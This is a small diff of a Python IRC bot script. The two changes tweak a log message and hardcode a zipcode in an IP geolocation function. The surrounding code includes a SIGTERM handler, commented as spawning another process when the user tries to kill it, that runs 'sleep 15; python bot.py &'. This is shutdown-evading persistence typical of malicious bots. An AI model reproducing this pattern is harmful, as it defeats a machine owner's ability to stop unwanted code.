@@ -69,7 +69,7 @@ def timeout_handler(signum, frame):                                             
 
 def sigterm_handler(signum, frame):                                             # if user tries to kill python process, it will spawn another one
     log('[#] ----Host attempted to shutdown bot----')
-    log('[#] ----Spawning subprocess----')
+    log('[#] ----Spawning subprocess in 15sec----')
     privmsg("----Host attempted to shutdown bot----")
     quit_status = True
     cmd = "sleep 15; python bot.py &"
@@ -239,7 +239,7 @@ def geo_locate(ip="",with_proxy=False):                                         
     city = geo[u"city"].encode('utf-8')
     region = geo[u"region_name"].encode('utf-8')
     country = geo[u"country_name"].encode('utf-8')
-    zipcode = geo[u"zipcode"].encode('utf-8')
+    zipcode = "00000" # geo[u"zipcode"].encode('utf-8')
 
     lat = geo[u"latitude"]
     lng = geo[u"longitude"]
